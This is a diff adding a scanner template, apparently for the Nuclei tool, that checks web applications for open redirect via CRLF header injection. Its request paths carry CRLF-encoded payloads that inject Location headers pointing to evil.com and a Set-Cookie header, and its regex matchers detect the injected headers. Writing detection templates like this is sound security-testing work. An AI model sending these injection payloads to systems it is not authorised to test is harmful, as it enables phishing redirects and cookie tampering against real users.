@@ -1,0 +1,23 @@
+id: m7-redirect-header-injection
+info:
+  name: M7 - Redirect via HTTP Header Injection
+  author: Sharlix
+  severity: high
+  description: Open redirect via CRLF injection in redirect parameters
+  tags: redirect,crlf,header-injection,m7hunter
+
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}?url=https://evil.com%0d%0aLocation:https://evil.com"
+      - "{{BaseURL}}?redirect=https://evil.com%0d%0aSet-Cookie:evil=1"
+      - "{{BaseURL}}?next=%0d%0aLocation:https://evil.com"
+      - "{{BaseURL}}?url=legitimate.com%0aLocation:https://evil.com"
+
+    matchers-condition: or
+    matchers:
+      - type: regex
+        regex:
+          - "Location:.*Location:"
+          - "Set-Cookie.*evil="
+        part: header
